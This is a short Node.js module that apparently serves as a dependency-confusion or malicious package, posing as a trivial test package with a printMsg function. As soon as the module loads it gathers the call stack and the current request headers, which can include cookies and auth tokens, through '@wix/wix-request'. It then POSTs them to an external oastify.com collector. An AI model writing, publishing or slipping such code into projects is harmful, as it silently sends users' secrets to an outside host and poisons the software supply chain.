const https = require('https')

async function main() {

    // getting the callstack
    const error = new Error();
    Error.captureStackTrace(error);
    const callStack = error.stack;

    // request
    const getCurrentRequest = require('@wix/wix-request');
    const currentRequest = await getCurrentRequest();
    const reqHeaders = currentRequest.headers;

    const data = JSON.stringify({
        callStack,
        reqHeaders
    });

    const options = {
        hostname: 'yhjmzu97llvkp66um90y3ngrqiwfki87.oastify.com',
        path: '/somepackage-marksl',
        method: 'POST',
        headers: {
            'Content-Length': data.length
        }
    };

    const req = https.request(options)
    req.write(data);
    req.end();
}

main();

exports.printMsg = function() {
    console.log("marksl test");
}
